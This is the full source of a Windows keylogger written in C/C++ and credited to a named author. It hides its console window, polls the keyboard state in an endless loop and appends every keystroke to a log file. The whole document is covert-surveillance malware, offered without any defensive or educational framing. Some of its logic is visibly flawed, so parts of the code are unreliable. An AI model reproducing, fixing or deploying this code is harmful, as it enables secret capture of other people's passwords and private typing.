// Author: Nemuel Wainaina

#include <stdio.h>
#include <windows.h>

using namespace std;

void hideWindow();
void logKey(char, FILE*);

int main(int argc, char* argv[]) {
    hideWindow();

    if(argc != 2) {
        return 1;
    }

    char* logFile = argv[1];
    FILE* fp = fopen(logFile, "a");
    char i;

    while(1) {
        for(i = 8; i <= 190; i++) {
            if(GetAsyncKeyState(i) == -32767) {
                logKey(i, fp);
            }
        }
    }

    fclose(fp);
    return 0;
}

void hideWindow() {
    HWND hWND;
    AllocConsole();
    hWND = FindWindowA("ConsoleWindowClass", NULL);
    ShowWindow(hWND, HIDE_WINDOW);
}

void logKey(char key, FILE* fp) {
    if(key == VK_BACK) {
        fprintf(fp, "%s", "[BACKSPACE]");
    } else if(key == VK_RETURN) {
        fprintf(fp, "%s", "\n");
    } else if(key == VK_SPACE) {
        fprintf(fp, "%s", " ");
    } else if(key == VK_TAB) {
        fprintf(fp, "%s", "[TAB]");
    } else if(key == VK_SHIFT) {
        fprintf(fp, "%s", "[SHIFT]");
    } else if(key == VK_CONTROL) {
        fprintf(fp, "%s", "[CONTROL]");
    } else if(key == VK_ESCAPE) {
        fprintf(fp, "%s", "[ESCAPE]");
    } else if(key == VK_HOME) {
        fprintf(fp, "%s", "[HOME]");
    } else if(key == VK_END) {
        fprintf(fp, "%s", "[END]");
    } else if(key == VK_RIGHT) {
        fprintf(fp, "%s", "[RIGHT_ARROW]");
    } else if(key == VK_LEFT) {
        fprintf(fp, "%s", "[LEFT_ARROW]");
    } else if(key == VK_UP) {
        fprintf(fp, "%s", "[UP_ARROW]");
    } else if(key == VK_DOWN) {
        fprintf(fp, "%s", "[DOWN_ARROW]");
    } else if(key == VK_CAPITAL) {
        fprintf(fp, "%s", "[CAPS_LOCK]");
    } else if(key == VK_RBUTTON) {
        fprintf(fp, "%s", "[MOUSE_RBUTTON]");
    } else if(key == VK_LBUTTON) {
        fprintf(fp, "%s", "[MOUSE_LBUTTON]");
    } else if((key == 110) || (key == 190)) {
        fprintf(fp, "%s", ".");
    } else {
        fprintf(fp, "%c", key);
    }
}
